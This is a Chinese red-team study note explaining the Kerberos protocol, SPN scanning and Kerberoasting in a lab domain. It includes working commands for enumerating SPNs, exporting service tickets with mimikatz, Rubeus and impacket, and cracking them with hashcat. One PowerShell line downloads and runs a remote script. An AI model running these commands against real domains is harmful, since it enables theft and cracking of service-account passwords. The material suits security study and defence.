---
title: 【内网学习笔记】24、SPN 的应用
date: 2021-09-07 12:12:04
id: 210907-121204
img: https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210907113159.png
tags:
- 红队
- 学习笔记
- 内网
categories:
- 内网学习笔记
---

## 0、前言

### SPN

Windows 域环境是基于微软的活动目录服务工作的，它在网络系统环境中将物理位置分散、所属部门不同的用户进行分组和集中资源，有效地对资源访问控制权限进行细粒度的分配，提高了网络环境的安全性及网络资源统一分配管理的便利性。

在域环境中运行的大量应用包含了多种资源，为了对资源的合理分类和再分配提供便利，微软给域内的每种资源分配了不同的服务主题名称即 SPN (Service Principal Name）

### Kerberos

Kerberos 是由 MIT 提出的一种网络身份验证协议，旨在通过密钥加密技术为客户端/服务器应用程序提供强身份验证，它也是主要用在域环境下的身份认证协议。

在 Kerberos 认证中，最主要的问题就是如何证明「你是你」的问题，比如当一个用户去访问服务器上的某服务时，服务器如何判断该用户是否有权限来访问自己主机上的服务，同时保证在这个过程中的通讯内容即使被拦截或篡改也不会影响通讯的安全性，这正是 Kerberos 解决的问题。

Kerberos 协议中的名称解释：

* Client: 访问服务的客户端
* Server: 提供服务的服务器
* KDC (Key Distribution Center): 密钥分发中心
* AS (Authentication Service): 认证服务器
* TGS (Ticket Granting Service): 票据授予服务
* DC (Domain Controller): 域控制器
* AD (Account Database): 用户数据库
* TGT (Ticket Granting Ticket): 票证授予票证
* ST (Servre Ticket): 服务票据

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210906154732.png)

根据上图，这里一步一步进行解释

**第一阶段：Clinet 与 AS**

① 客户端向认证服务器 AS 发起请求，请求内容为自己的用户名、主机 IP 和当前时间戳。

② AS 接收到请求，此时 AS 会根据用户名在用户数据库 AD 中寻找，判断这个用户名在不在白名单里，此时只会查找具有相同用户名的用户，并不会判断身份的可靠性；如果没有该用户名，认证失败；如果存在该用户名，则 AS 便认为用户存在，此时 AS 对客户端做出响应，响应内容包含两部分：

* 第一部分：票据授予票据 TGT，客户端需要使用 TGT 去密钥分发中心 KDC 中的票据授予服务 TGS 获取访问网络服务所需的票据，TGT 中包含的内容有 kerberos 数据库中存在的客户端信息、IP、当前时间戳 
* 第二部分：使用客户端密钥加密的一段内容，这段内容包括：用于客户端和 TGS 之间通信的 Session_Key (CT_SK) ，客户端即将访问的 TGS 信息以及 TGT 的有效时间和一个当前时间戳，该部分内容使用客户端密钥加密，所以客户端在拿到该部分内容时可以通过自己的密钥解密。

至此，第一阶段通信完成。

**第二阶段：Clinet 与 TGS**

此时客户端已经获取到了 AS 返回的消息，客户端会将 AS 返回的第二部分内容进行解密，分别获得时间戳、接下来要访问的 TGS 信息以及用于和 TGS 通信的密钥 CT_SK

首先客户端会判断时间戳与自己发出的时间差是否大于 5 分钟，如果大于 5 分钟那就认为这个 AS 是伪造的，认证失败，否则就继续准备向 TGS 发起请求。

③ 客户端向 TGS 发起请求，请求的内容包含三部分：

* 第一部分：使用 CT_SK 加密的客户端信息、IP、时间戳
* 第二部分：自己想要访问的 Server 服务信息（明文形式）
* 第三部分：使用 TGS 密钥加密的 TGT

④ TGS 接收到请求，首先判断当前系统是否存在客户端想要访问的 Server 服务，如果不存在，认证失败，如果存在则继续接下来的认证。

​	接下来 TGS 利用自己的秘钥解密 TGT 内容，此时 TGS 获取到经过 AS 认证后的用户信息、CT_SK、时间戳信息，通过时间戳判断此次请求时延是否正常，如果时延正常就继续下一步。

​	之后 TGS 会使用 CT_SK 解密客户端发来的第一部分内容，取出其中的用户信息和 TGT 里的用户信息进行对比，如果全部一致则认为客户端身份正常，继续下一步。

​	此时 TGS 将向客户端发起响应，响应信息包含两部分：

* 第一部分：使用服务端密码加密的服务票据 ST，其中包括客户端信息、IP、客户端待访问的服务端信息、ST 有效信息、时间戳以及用于客户端和服务端之间通信的 CS_SK
* 第二部分：使用 CT_SK 加密的内容，其中包括 CS_SK 、时间戳和 ST 的有效时间。

至此，第二阶段通信完成。

**第三阶段：Clinet 与 Server**

此时客户端收到来自 TGS 的响应，并使用本地缓存的 CT_SK 解密出 TGS 返回的第二部分内容，检查时间戳无误后，取出 CS_SK 准备向服务端发起请求。这里由于 TGS 返回的第一部分信息是用的服务端秘钥加密的，因此这里的客户端是无法进行解密的。

⑤ 客户端向服务端发送请求，请求内容包括两部分：

* 第一部分：利用 CS_SK 将自己的主机信息和时间戳进行加密的信息
* 第二部分：第 ④ 步里 TGS 向客户端返回的第一部分内容，即使用服务端密码加密的服务票据 ST

⑥ 服务端此时收到了来自客户端的请求，它会使用自己的密钥解密客户端发来的第二部分内容，核对时间戳之后，取出 CS_SK，利用 CS_SK 解密第一部分内容，从而获得经过 TGS 认证后的客户端信息。

此时服务端会将第一部分解密后的信息与第二部分解密后的信息进行对比，如果一致则说明该客户端身份为真实身份，此时服务端向客户端响应使用 CS_SK 加密的表示接受的信息，客户端接受到信息后也确认了服务端的真实性。

至此，第三阶段通信完成，到这里整个 kerberos 认证也就完成了，接下来客户端与服务端就能放心的进行通信了。

这里可以再通过时序图加深下印象。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210906174237.jpg)

注意点：

* KDC 服务默认会安装在一个域的域控中
* Kerberos 认证采用对称加密算法
* 三个阶段里都使用了密钥，这些密钥都是临时生成的，也只在一次会话中生效，因此即使密钥被劫持，等到密钥被破解可能这次会话也都早已结束。
* AD 其实是一个类似于本机 SAM 的一个数据库，全称叫 Account Database，存储所有 Client 白名单，只有存在于白名单的 Client 才能顺利申请到 TGT
* KDC 服务框架中包含一个 KRBTGT 账户，它是在创建域时系统自动创建的一个账号，可以暂时理解为它就是一个无法登陆的账号，在发放票据时会使用到它的密码 HASH 值。

## 1、SPN

### 相关概念

在使用 Kerberos 协议进行身份验证的网络中，必须在内置账号（NetworkService、LocalSystem）或者用户账号下为服务器注册 SPN。

对于内置账号，SPN 将自动进行注册，如果在域用户账号下运行服务，则必须为要使用的账号手动注册 SPN。

因为域环境中的每台服务器都需要在 Kerberos 身份验证服务中注册 SPN ，所以 RT 会直接向域控制器发送查询请求，获取需要的服务的 SPN ，从而知道自己需要使用的服务资源在哪台机器上。

SPN 格式如下：

```
serviceclass "/" hostname [":"port] ["/" servicename]
```

> serviceclass（必选）：服务组件名称
>
> hostname（必选）：以 “/” 与后面的名称分隔，这里的 hostname 是计算机的 FQDN (全限定域名，同时带有计算机名和域名)
>
> port（可选）：以冒号分隔，后面的内容为该服务监听的端口号
>
> servicename（可选）：一个字符串，可以是服务的专有名称（DN）、objectGuid、Internet主机名或全限定域名

### 常见 SPN 服务

MSSQL 服务

```
MSSQLSvc/DBServer.teamssix.com:1433
```

Exchange 服务

```
exchangeMDB/ExServer.teamssix.com
```

RDP 服务

```
TERMSRV/ExServer.teamssix.com
```

WSMan/WinRM/PSRemoting 服务

```
WSMAN/ExServer.teamssix.com
```

### SPN 扫描脚本

SPN 扫描也叫「扫描 Kerberos 服务实例名称」，在活动目录中发现服务的最佳方法就是 SPN 扫描。

SPN 扫描通过请求特定 SPN 类型的服务主体名称来查找服务，与网络端口相比，SPN 扫描的主要特点是不需要通过连接网络中的每个 IP 地址来检查服务端口，因此不会因触发内网中的安全设备规则而产生大量的告警日志。

由于 SPN 查询是 Kerberos 票据行为的一部分，所以检测难度较大。

#### setspn

setspn 是 Windows 自带命令，以下命令可列出域中所有的 SPN 信息

```
setspn -T teamssix -Q */*
```

#### Active Directory 模块

PowerShell 模块 Active Directory 只在域控上有

```
Import-Module ActiveDirectory
get-aduser -filter {AdminCount -eq 1 -and (servicePrincipalName -ne 0)} -prop * |select name,whencreated,pwdlastset,lastlogon
```

或者使用大佬导出的模块，这样普通用户也可以使用该模块，下载地址：[https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll](https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll)

```
Import-Module .\Microsoft.ActiveDirectory.Management.dll
get-aduser -filter {AdminCount -eq 1 -and (servicePrincipalName -ne 0)} -prop * |select name,whencreated,pwdlastset,lastlogon
```

#### PowerView

PowerView 下载地址：[https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

```
Import-Module .\PowerView.ps1
Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,last
```

#### Powershell-AD-Recon

Powershell-AD-Recon 提供了一系列获取服务与服务登录账号和运行服务的主机之间的对应关系的工具，这些服务包括但不限于 MSSQL、Exchange、RDP、WinRM

Powershell-AD-Recon 下载地址：[https://github.com/PyroTek3/PowerShell-AD-Recon](https://github.com/PyroTek3/PowerShell-AD-Recon)

Powershell-AD-Recon 工具包里的内容如下：

```
Discover-PSInterestingServices	# 查找所有 SPN 服务
Discover-PSMSExchangeServers		# 查找 Exchange 服务器
Discover-PSMSSQLServers         # 查找 MSSQL 服务器
Find-PSServiceAccounts          # 查找服务账户
Get-DomainKerberosPolicy        # 获取域 Kerberos 策略
Get-PSADForestInfo              # 获取域森林信息
Get-PSADForestqInfo             # 获取域森林 KRBTGT 信息
```

> 下载后的文件是没有 .ps1 后缀的，需要自己添加上

由于 SPN 是通过 LDAP 协议向域控制器进行查询的，因此 RT 需要获得一个普通的域用户权限才可以进行 SPN 扫描。

将 PowerShell 脚本导入并执行，以 MSSQL 服务为例

```
Import-Module .\Discover-PSMSSQLServers.ps1
Discover-PSMSSQLServers
或者
PowerShell -Exec bypass -C "Import-Module .\Discover-PSMSSQLServers.ps1;Discover-PSMSSQLServers"
```

扫描域中所有的 SPN 信息

```
Import-Module .\Discover-PSInterestingServices.ps1
Discover-PSInterestingServices
或者
PowerShell -Exec bypass -C "Import-Module .\Discover-PSInterestingServices.ps1;Discover-PSInterestingServices"
```

#### kerberoast

kerberoast 工具包里的 GetUserSPNs.ps1，可以帮助我们发现仅与用户帐户相关联的服务。

kerberoast 下载地址：[https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

```
./GetUserSPNs.ps1
或者
PowerShell -Exec bypass -File GetUserSPNs.ps1
```

kerberoast 工具包里的 GetUserSPNs.vbs 也能实现相同的功能

```
cscript.exe GetUserSPNs.vbs
```

#### PowerShellery

PowerShellery 工具包里包含了 Get-SPN，可以为各种服务收集 SPN

PowerShellery 下载地址：[https://github.com/nullbind/Powershellery](https://github.com/nullbind/Powershellery)

```
Import-Module .\Get-SPN.psm1
Get-SPN -type service -search *
或者
PowerShell -Exec bypass -C "Import-Module .\Get-SPN.psm1;Get-SPN -type service -search *"
```

结果也可以转换为表格的形式，以便于浏览

```
Import-Module .\Get-SPN.psm1
Get-SPN -type service -search * -List yes
或者
PowerShell -Exec bypass -C "Import-Module .\Get-SPN.psm1;Get-SPN -type service -search * -List yes"
```

另外一个 Get-DomainSpn.psm1 脚本可以用来获取 UserSID、服务和实际用户

```
Import-Module .\Get-DomainSpn.psm1
Get-DomainSpn
或者
PowerShell -Exec bypass -C "Import-Module .\Get-DomainSpn.psm1;Get-DomainSpn"
```

#### Impacket

Impacket 下载地址：[https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)

上面的工具都是在域内的机器里扫描 SPN 的，利用 impacket 工具包下的 GetUserSPNs.py 可以在非域主机中扫描目标的 SPN

```
python3 GetUserSPNs.py -dc-ip 192.168.7.7 teamssix.com/test
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210906144640.png)

## 2、kerberoast

kerberoast 是一种针对 Kerberos 协议的利用方式，在因为需要使用某个特定资源而向 TGS 发送 Kerberos 服务票据的请求时，用户首先需要使用具有有效身份权限的 TGT 向 TGS 请求相应服务的票据。

当 TGT 被验证有效且具有该服务的权限时，TGS 会向用户发送一张票据。该票据使用与 SPN 相关联的计算机服务账号的 NTLM Hash（RC4_HMAC_MD5），就是说，RT 会通过 Kerberoast 尝试使用不同的 NTLM Hash 来打开该 Kerberos 票据，如果 RT 使用的 NTLM Hash 是正确的，Kerberos 票据就会被打开，而该 NTLM Hash 对应于该计算机服务账号的密码。

kerberoast 的利用思路：

1、查询 SPN 寻找在 Users 下并且是高权限域用户的服务

2、请求并导出 TGS

3、对 TGS 进行爆破

这里以 MSSQL 服务为例，并尝试破解该服务的票据

手动注册 SPN

```
setspn -A MSSQLSvc/DBSRV.teamssix.com:1433 test
```

查看用户所对应的 SPN

```
setspn -L teamssix.com\test
```

也可以使用 adsiedit.msc 查看用户 SPN 及其他高级属性

为用户配置指定服务的登录权限，gpedit.msc 打开本地组策略编辑器，找到以下路径，将用户添加进去，例如这里添加的用户为 test

```
\计算机配置\Windows 设置\安全设置\本地策略\用户权限分配\作为服务登录
```

因为 Kerberos 协议的默认加密方式是 AES256_HMAC，而通过 tgsreperack.py 脚本无法破解该加密方式，因此我们可以通过组策略将加密方式设置为 RC_HMAC_MD5

在本地组策略编辑器中，找到以下路径，将加密方式设置为 RC_HMAC_MD5

```
\计算机配置\Windows 设置\安全设置\本地策略\安全选项\网络安全：配置 Kerberos 允许的加密类型
```

请求指定 SPN 的服务票据

```
$SPNName = 'MSSQLSvc/DBSRV.teamssix.com'
Add-Type -AssemblyNAme System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName
```

或者请求所有服务的服务票据

```
Add-Type -AssemblyName System.IdentityModel  
setspn -q */* | Select-String '^CN' -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
```

可以使用 klist 查看本地缓存的票证，看看有没有新的票据

之后在 mimikatz 中执行如下命令，将内存中的票据导出

```
kerberos::list /export
```

也可以不使用 mimikatz，使用 powershell 脚本导出支持 hashcat 破解的格式

```
powershell.exe -exec bypass -c "IEX (New-Object System.Net.Webclient).DownloadString('https://ghproxy.com/https://raw.githubusercontent.com/EmpireProject/Empire/6ee7e036607a62b0192daed46d3711afc65c3921/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl"
```

或者使用 Rubeus 获取票据

```
Rubeus.exe kerberoast
```

也可以使用 impacket 获取票据

```
python3 GetUserSPNs.py -request -dc-ip 192.168.7.7 -debug teamssix.com/test
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210907113159.png)

将 MSSQL 服务所对应的票据复制到有 kerberoast 的机器上，之后用 kerberoast 中的 tgsreperack.py 脚本破解票据的 NTLM Hash

Kerberoast 脚本下载地址：[https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

```
python tgsrepcrack.py password.txt mssql.kirbi
```

或者使用 hashcat 破解 powershell 脚本、Rubeus、impacket 获取到的服务票据

```
hashcat -m 13100 /tmp/hash.txt /tmp/password.list -o found.txt --force
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210907113300.png)

> 参考文章：
>
> [https://www.jianshu.com/p/23a4e8978a30](https://www.jianshu.com/p/23a4e8978a30)
>
> [https://y4er.com/post/kerberos-kerberoasting-spn](https://y4er.com/post/kerberos-kerberoasting-spn)
>
> [https://www.freebuf.com/articles/web/280406.html](https://www.freebuf.com/articles/web/280406.html)
>
> [https://cloud.tencent.com/developer/article/1170758](https://cloud.tencent.com/developer/article/1170758)
>
> [https://www.cnblogs.com/zpchcbd/p/11707302.html](https://www.cnblogs.com/zpchcbd/p/11707302.html)
>
> [https://blog.csdn.net/wulantian/article/details/42418231](https://blog.csdn.net/wulantian/article/details/42418231)
>
> [https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/](https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/)
>
> 更多信息欢迎关注我的微信公众号：TeamsSix

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png)
